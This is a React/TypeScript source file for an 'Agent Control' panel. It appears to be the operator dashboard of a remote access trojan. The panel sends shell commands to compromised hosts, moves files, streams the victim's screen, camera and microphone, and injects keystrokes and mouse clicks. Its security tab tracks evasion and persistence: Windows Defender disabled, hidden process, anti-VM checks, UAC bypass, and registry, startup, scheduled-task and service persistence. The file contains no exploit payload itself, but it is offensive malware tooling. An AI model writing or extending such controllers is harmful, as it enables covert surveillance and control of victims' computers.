import React, { useState, useEffect } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { ScrollArea } from '@/components/ui/scroll-area';
import { Input } from '@/components/ui/input';
import { Textarea } from '@/components/ui/textarea';
import { Separator } from '@/components/ui/separator';
import { Progress } from '@/components/ui/progress';
import { 
  Terminal, 
  Monitor, 
  Camera, 
  Mic, 
  Upload, 
  Download,
  Play,
  Square,
  Settings,
  Activity,
  Shield,
  Database,
  Keyboard,
  Mouse,
  FileText,
  Wifi,
  WifiOff
} from 'lucide-react';
import type { Agent, CommandResult, FileTransfer, WebRTCStats, QualityData } from '@/types/agent';

interface AgentControlPanelProps {
  agent: Agent;
  commandResults: CommandResult[];
  fileTransfers: FileTransfer[];
  webrtcStats?: WebRTCStats;
  qualityData?: QualityData;
  onExecuteCommand: (command: string) => void;
  onUploadFile: (file: File, destinationPath: string) => void;
  onDownloadFile: (filename: string, localPath?: string) => void;
  onStartStreaming: (type: 'screen' | 'camera' | 'audio' | 'all') => void;
  onStopStreaming: () => void;
  onSetQuality: (quality: 'low' | 'medium' | 'high' | 'auto') => void;
  onGetStats: () => void;
  onKeyPress: (key: string, modifiers?: string[]) => void;
  onMouseMove: (x: number, y: number) => void;
  onMouseClick: (x: number, y: number, button: 'left' | 'right' | 'middle') => void;
}

const AgentControlPanel: React.FC<AgentControlPanelProps> = ({
  agent,
  commandResults,
  fileTransfers,
  webrtcStats,
  qualityData,
  onExecuteCommand,
  onUploadFile,
  onDownloadFile,
  onStartStreaming,
  onStopStreaming,
  onSetQuality,
  onGetStats,
  onKeyPress,
  onMouseMove,
  onMouseClick
}) => {
  const [activeTab, setActiveTab] = useState('terminal');
  const [command, setCommand] = useState('');
  const [uploadFile, setUploadFile] = useState<File | null>(null);
  const [uploadPath, setUploadPath] = useState('C:\\temp\\');
  const [downloadFilename, setDownloadFilename] = useState('');
  const [downloadPath, setDownloadPath] = useState('');
  const [streamingActive, setStreamingActive] = useState(false);
  const [currentQuality, setCurrentQuality] = useState<'low' | 'medium' | 'high' | 'auto'>('auto');

  // Filter command results and file transfers for this agent
  const agentCommandResults = commandResults.filter(result => result.agent_id === agent.id);
  const agentFileTransfers = fileTransfers.filter(transfer => transfer.agent_id === agent.id);

  const handleExecuteCommand = () => {
    if (command.trim()) {
      onExecuteCommand(command);
      setCommand('');
    }
  };

  const handleUploadFile = () => {
    if (uploadFile && uploadPath.trim()) {
      onUploadFile(uploadFile, uploadPath);
      setUploadFile(null);
    }
  };

  const handleDownloadFile = () => {
    if (downloadFilename.trim()) {
      onDownloadFile(downloadFilename, downloadPath || undefined);
      setDownloadFilename('');
      setDownloadPath('');
    }
  };

  const handleStreamingToggle = (type: 'screen' | 'camera' | 'audio' | 'all') => {
    if (streamingActive) {
      onStopStreaming();
      setStreamingActive(false);
    } else {
      onStartStreaming(type);
      setStreamingActive(true);
    }
  };

  const handleQualityChange = (quality: 'low' | 'medium' | 'high' | 'auto') => {
    setCurrentQuality(quality);
    onSetQuality(quality);
  };

  const formatFileSize = (bytes: number) => {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
  };

  return (
    <Card className="w-full">
      <CardHeader>
        <CardTitle className="flex items-center justify-between">
          <div className="flex items-center gap-2">
            <div className={`w-3 h-3 rounded-full ${agent.status === 'online' ? 'bg-green-500' : 'bg-red-500'}`} />
            <span>Agent Control - {agent.hostname}</span>
            <Badge variant={agent.status === 'online' ? 'default' : 'secondary'}>
              {agent.status}
            </Badge>
          </div>
          <div className="flex items-center gap-2 text-sm text-muted-foreground">
            <span>{agent.ip}</span>
            <span>•</span>
            <span>{agent.os}</span>
          </div>
        </CardTitle>
      </CardHeader>
      <CardContent>
        <Tabs value={activeTab} onValueChange={setActiveTab}>
          <TabsList className="grid w-full grid-cols-6">
            <TabsTrigger value="terminal" className="flex items-center gap-1">
              <Terminal className="w-4 h-4" />
              Terminal
            </TabsTrigger>
            <TabsTrigger value="streaming" className="flex items-center gap-1">
              <Monitor className="w-4 h-4" />
              Streaming
            </TabsTrigger>
            <TabsTrigger value="files" className="flex items-center gap-1">
              <FileText className="w-4 h-4" />
              Files
            </TabsTrigger>
            <TabsTrigger value="remote" className="flex items-center gap-1">
              <Mouse className="w-4 h-4" />
              Remote
            </TabsTrigger>
            <TabsTrigger value="security" className="flex items-center gap-1">
              <Shield className="w-4 h-4" />
              Security
            </TabsTrigger>
            <TabsTrigger value="stats" className="flex items-center gap-1">
              <Activity className="w-4 h-4" />
              Stats
            </TabsTrigger>
          </TabsList>

          <TabsContent value="terminal" className="mt-4 space-y-4">
            <div className="space-y-2">
              <div className="flex gap-2">
                <Input
                  placeholder="Enter command..."
                  value={command}
                  onChange={(e) => setCommand(e.target.value)}
                  onKeyPress={(e) => e.key === 'Enter' && handleExecuteCommand()}
                  className="flex-1"
                />
                <Button onClick={handleExecuteCommand} disabled={agent.status !== 'online'}>
                  <Terminal className="w-4 h-4 mr-1" />
                  Execute
                </Button>
              </div>
              
              <ScrollArea className="h-64 border rounded p-3 bg-black text-green-400 font-mono text-sm">
                {agentCommandResults.length === 0 ? (
                  <div className="text-muted-foreground">No command output yet...</div>
                ) : (
                  <div className="space-y-2">
                    {agentCommandResults.map((result, index) => (
                      <div key={index} className="space-y-1">
                        <div className="text-blue-400 text-xs">
                          [{new Date(result.timestamp).toLocaleTimeString()}]
                        </div>
                        <pre className="whitespace-pre-wrap">{result.output}</pre>
                        {index < agentCommandResults.length - 1 && <Separator className="my-2" />}
                      </div>
                    ))}
                  </div>
                )}
              </ScrollArea>
            </div>

            <div className="grid grid-cols-2 gap-2">
              <Button variant="outline" onClick={() => onExecuteCommand('dir')}>
                List Directory
              </Button>
              <Button variant="outline" onClick={() => onExecuteCommand('systeminfo')}>
                System Info
              </Button>
              <Button variant="outline" onClick={() => onExecuteCommand('tasklist')}>
                Process List
              </Button>
              <Button variant="outline" onClick={() => onExecuteCommand('netstat -an')}>
                Network Status
              </Button>
            </div>
          </TabsContent>

          <TabsContent value="streaming" className="mt-4 space-y-4">
            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-2">
                <h4 className="font-medium flex items-center gap-2">
                  <Monitor className="w-4 h-4" />
                  Screen Streaming
                </h4>
                <div className="flex gap-2">
                  <Button
                    variant={streamingActive ? "destructive" : "default"}
                    onClick={() => handleStreamingToggle('screen')}
                    disabled={agent.status !== 'online'}
                  >
                    {streamingActive ? <Square className="w-4 h-4 mr-1" /> : <Play className="w-4 h-4 mr-1" />}
                    {streamingActive ? 'Stop' : 'Start'} Screen
                  </Button>
                  <Button
                    variant="outline"
                    onClick={() => handleStreamingToggle('camera')}
                    disabled={agent.status !== 'online'}
                  >
                    <Camera className="w-4 h-4 mr-1" />
                    Camera
                  </Button>
                  <Button
                    variant="outline"
                    onClick={() => handleStreamingToggle('audio')}
                    disabled={agent.status !== 'online'}
                  >
                    <Mic className="w-4 h-4 mr-1" />
                    Audio
                  </Button>
                </div>
              </div>

              <div className="space-y-2">
                <h4 className="font-medium flex items-center gap-2">
                  <Settings className="w-4 h-4" />
                  Quality Settings
                </h4>
                <div className="grid grid-cols-2 gap-2">
                  {(['low', 'medium', 'high', 'auto'] as const).map((quality) => (
                    <Button
                      key={quality}
                      variant={currentQuality === quality ? "default" : "outline"}
                      size="sm"
                      onClick={() => handleQualityChange(quality)}
                    >
                      {quality.charAt(0).toUpperCase() + quality.slice(1)}
                    </Button>
                  ))}
                </div>
              </div>
            </div>

            {webrtcStats && (
              <div className="space-y-2">
                <h4 className="font-medium">WebRTC Connection Status</h4>
                <div className="grid grid-cols-2 gap-4 text-sm">
                  <div className="flex justify-between">
                    <span className="text-muted-foreground">Connection:</span>
                    <Badge variant={webrtcStats.connection_state === 'connected' ? 'default' : 'secondary'}>
                      {webrtcStats.connection_state}
                    </Badge>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-muted-foreground">ICE State:</span>
                    <Badge variant={webrtcStats.ice_connection_state === 'connected' ? 'default' : 'secondary'}>
                      {webrtcStats.ice_connection_state}
                    </Badge>
                  </div>
                </div>
              </div>
            )}

            {qualityData && (
              <div className="space-y-2">
                <h4 className="font-medium">Connection Quality</h4>
                <div className="space-y-2">
                  <div className="flex items-center justify-between">
                    <span className="text-sm text-muted-foreground">Quality Score:</span>
                    <div className="flex items-center gap-2">
                      <Progress value={qualityData.quality_score} className="w-20" />
                      <span className="text-sm font-medium">{qualityData.quality_score}/100</span>
                    </div>
                  </div>
                  <div className="grid grid-cols-2 gap-4 text-sm">
                    <div className="flex justify-between">
                      <span className="text-muted-foreground">Bitrate:</span>
                      <span>{Math.round(qualityData.bandwidth_stats.current_bitrate)} kbps</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-muted-foreground">Latency:</span>
                      <span>{Math.round(qualityData.bandwidth_stats.rtt)} ms</span>
                    </div>
                  </div>
                  {qualityData.quality_issues.length > 0 && (
                    <div className="text-sm text-yellow-600">
                      Issues: {qualityData.quality_issues.join(', ')}
                    </div>
                  )}
                </div>
              </div>
            )}
          </TabsContent>

          <TabsContent value="files" className="mt-4 space-y-4">
            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-2">
                <h4 className="font-medium flex items-center gap-2">
                  <Upload className="w-4 h-4" />
                  Upload File
                </h4>
                <Input
                  type="file"
                  onChange={(e) => setUploadFile(e.target.files?.[0] || null)}
                />
                <Input
                  placeholder="Destination path (e.g., C:\temp\)"
                  value={uploadPath}
                  onChange={(e) => setUploadPath(e.target.value)}
                />
                <Button
                  onClick={handleUploadFile}
                  disabled={!uploadFile || !uploadPath.trim() || agent.status !== 'online'}
                  className="w-full"
                >
                  <Upload className="w-4 h-4 mr-1" />
                  Upload
                </Button>
              </div>

              <div className="space-y-2">
                <h4 className="font-medium flex items-center gap-2">
                  <Download className="w-4 h-4" />
                  Download File
                </h4>
                <Input
                  placeholder="Remote file path"
                  value={downloadFilename}
                  onChange={(e) => setDownloadFilename(e.target.value)}
                />
                <Input
                  placeholder="Local save path (optional)"
                  value={downloadPath}
                  onChange={(e) => setDownloadPath(e.target.value)}
                />
                <Button
                  onClick={handleDownloadFile}
                  disabled={!downloadFilename.trim() || agent.status !== 'online'}
                  className="w-full"
                >
                  <Download className="w-4 h-4 mr-1" />
                  Download
                </Button>
              </div>
            </div>

            {agentFileTransfers.length > 0 && (
              <div className="space-y-2">
                <h4 className="font-medium">Active Transfers</h4>
                <ScrollArea className="h-32 border rounded p-2">
                  {agentFileTransfers.map((transfer) => (
                    <div key={transfer.id} className="space-y-2 p-2 border rounded mb-2">
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-2">
                          {transfer.direction === 'upload' ? 
                            <Upload className="w-4 h-4 text-blue-500" /> : 
                            <Download className="w-4 h-4 text-green-500" />
                          }
                          <span className="font-medium text-sm">{transfer.filename}</span>
                          <Badge variant={transfer.status === 'completed' ? 'default' : 'secondary'}>
                            {transfer.status}
                          </Badge>
                        </div>
                        <span className="text-sm text-muted-foreground">
                          {formatFileSize(transfer.size)}
                        </span>
                      </div>
                      <div className="space-y-1">
                        <div className="flex justify-between text-xs text-muted-foreground">
                          <span>{Math.round(transfer.progress)}%</span>
                          {transfer.speed > 0 && (
                            <span>{formatFileSize(transfer.speed)}/s</span>
                          )}
                        </div>
                        <Progress value={transfer.progress} className="h-2" />
                      </div>
                    </div>
                  ))}
                </ScrollArea>
              </div>
            )}
          </TabsContent>

          <TabsContent value="remote" className="mt-4 space-y-4">
            <div className="space-y-4">
              <div className="space-y-2">
                <h4 className="font-medium flex items-center gap-2">
                  <Keyboard className="w-4 h-4" />
                  Keyboard Control
                </h4>
                <div className="grid grid-cols-4 gap-2">
                  {['Enter', 'Tab', 'Escape', 'Delete'].map((key) => (
                    <Button
                      key={key}
                      variant="outline"
                      size="sm"
                      onClick={() => onKeyPress(key)}
                      disabled={agent.status !== 'online'}
                    >
                      {key}
                    </Button>
                  ))}
                </div>
                <div className="grid grid-cols-3 gap-2">
                  {['Ctrl+C', 'Ctrl+V', 'Alt+Tab'].map((combo) => (
                    <Button
                      key={combo}
                      variant="outline"
                      size="sm"
                      onClick={() => {
                        const [modifier, key] = combo.split('+');
                        onKeyPress(key, [modifier.toLowerCase()]);
                      }}
                      disabled={agent.status !== 'online'}
                    >
                      {combo}
                    </Button>
                  ))}
                </div>
              </div>

              <div className="space-y-2">
                <h4 className="font-medium flex items-center gap-2">
                  <Mouse className="w-4 h-4" />
                  Mouse Control
                </h4>
                <div className="grid grid-cols-3 gap-2">
                  <Button
                    variant="outline"
                    onClick={() => onMouseClick(100, 100, 'left')}
                    disabled={agent.status !== 'online'}
                  >
                    Left Click
                  </Button>
                  <Button
                    variant="outline"
                    onClick={() => onMouseClick(100, 100, 'right')}
                    disabled={agent.status !== 'online'}
                  >
                    Right Click
                  </Button>
                  <Button
                    variant="outline"
                    onClick={() => onMouseClick(100, 100, 'middle')}
                    disabled={agent.status !== 'online'}
                  >
                    Middle Click
                  </Button>
                </div>
              </div>
            </div>
          </TabsContent>

          <TabsContent value="security" className="mt-4 space-y-4">
            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-2">
                <h4 className="font-medium">Security Status</h4>
                <div className="space-y-2">
                  <div className="flex justify-between items-center">
                    <span className="text-sm text-muted-foreground">Windows Defender:</span>
                    <Badge variant={agent.security.defenderDisabled ? 'destructive' : 'default'}>
                      {agent.security.defenderDisabled ? 'Disabled' : 'Active'}
                    </Badge>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-sm text-muted-foreground">Process Hidden:</span>
                    <Badge variant={agent.security.processHidden ? 'default' : 'secondary'}>
                      {agent.security.processHidden ? 'Yes' : 'No'}
                    </Badge>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-sm text-muted-foreground">Anti-VM:</span>
                    <Badge variant={agent.security.antiVm ? 'default' : 'secondary'}>
                      {agent.security.antiVm ? 'Active' : 'Inactive'}
                    </Badge>
                  </div>
                </div>
              </div>

              <div className="space-y-2">
                <h4 className="font-medium">Privileges</h4>
                <div className="space-y-2">
                  <div className="flex justify-between items-center">
                    <span className="text-sm text-muted-foreground">Admin Rights:</span>
                    <Badge variant={agent.privileges.admin ? 'default' : 'secondary'}>
                      {agent.privileges.admin ? 'Yes' : 'No'}
                    </Badge>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-sm text-muted-foreground">UAC Bypassed:</span>
                    <Badge variant={agent.privileges.uacBypassed ? 'default' : 'secondary'}>
                      {agent.privileges.uacBypassed ? 'Yes' : 'No'}
                    </Badge>
                  </div>
                  {agent.privileges.method && (
                    <div className="text-xs text-muted-foreground">
                      Method: {agent.privileges.method}
                    </div>
                  )}
                </div>
              </div>
            </div>

            <div className="space-y-2">
              <h4 className="font-medium">Persistence Methods</h4>
              <div className="grid grid-cols-2 gap-4 text-sm">
                <div className="flex justify-between">
                  <span className="text-muted-foreground">Registry:</span>
                  <Badge variant={agent.persistence.registry ? 'default' : 'secondary'}>
                    {agent.persistence.registry ? 'Active' : 'Inactive'}
                  </Badge>
                </div>
                <div className="flex justify-between">
                  <span className="text-muted-foreground">Startup:</span>
                  <Badge variant={agent.persistence.startup ? 'default' : 'secondary'}>
                    {agent.persistence.startup ? 'Active' : 'Inactive'}
                  </Badge>
                </div>
                <div className="flex justify-between">
                  <span className="text-muted-foreground">Scheduled Tasks:</span>
                  <Badge variant={agent.persistence.scheduledTasks ? 'default' : 'secondary'}>
                    {agent.persistence.scheduledTasks ? 'Active' : 'Inactive'}
                  </Badge>
                </div>
                <div className="flex justify-between">
                  <span className="text-muted-foreground">Services:</span>
                  <Badge variant={agent.persistence.services ? 'default' : 'secondary'}>
                    {agent.persistence.services ? 'Active' : 'Inactive'}
                  </Badge>
                </div>
              </div>
            </div>
          </TabsContent>

          <TabsContent value="stats" className="mt-4 space-y-4">
            <div className="flex justify-between items-center">
              <h4 className="font-medium">Agent Statistics</h4>
              <Button variant="outline" size="sm" onClick={onGetStats}>
                <Activity className="w-4 h-4 mr-1" />
                Refresh
              </Button>
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-2">
                <h5 className="font-medium text-sm">Connection Info</h5>
                <div className="space-y-1 text-sm">
                  <div className="flex justify-between">
                    <span className="text-muted-foreground">Agent ID:</span>
                    <span className="font-mono text-xs">{agent.id}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-muted-foreground">Last Seen:</span>
                    <span>{new Date(agent.lastSeen).toLocaleString()}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-muted-foreground">Capabilities:</span>
                    <span>{agent.capabilities.length}</span>
                  </div>
                </div>
              </div>

              <div className="space-y-2">
                <h5 className="font-medium text-sm">Streaming Status</h5>
                <div className="space-y-1 text-sm">
                  <div className="flex justify-between">
                    <span className="text-muted-foreground">Screen:</span>
                    <Badge variant={agent.streams.screen ? 'default' : 'secondary'}>
                      {agent.streams.screen ? 'Active' : 'Inactive'}
                    </Badge>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-muted-foreground">Camera:</span>
                    <Badge variant={agent.streams.camera ? 'default' : 'secondary'}>
                      {agent.streams.camera ? 'Active' : 'Inactive'}
                    </Badge>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-muted-foreground">Audio:</span>
                    <Badge variant={agent.streams.audio ? 'default' : 'secondary'}>
                      {agent.streams.audio ? 'Active' : 'Inactive'}
                    </Badge>
                  </div>
                </div>
              </div>
            </div>

            {qualityData && (
              <div className="space-y-2">
                <h5 className="font-medium text-sm">Performance Metrics</h5>
                <div className="grid grid-cols-2 gap-4 text-sm">
                  <div className="flex justify-between">
                    <span className="text-muted-foreground">Available Bandwidth:</span>
                    <span>{Math.round(qualityData.bandwidth_stats.available_bandwidth)} kbps</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-muted-foreground">Packets Lost:</span>
                    <span>{qualityData.bandwidth_stats.packets_lost}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-muted-foreground">Jitter:</span>
                    <span>{Math.round(qualityData.bandwidth_stats.jitter)} ms</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-muted-foreground">Quality Score:</span>
                    <span>{qualityData.quality_score}/100</span>
                  </div>
                </div>
              </div>
            )}
          </TabsContent>
        </Tabs>
      </CardContent>
    </Card>
  );
};

export default AgentControlPanel;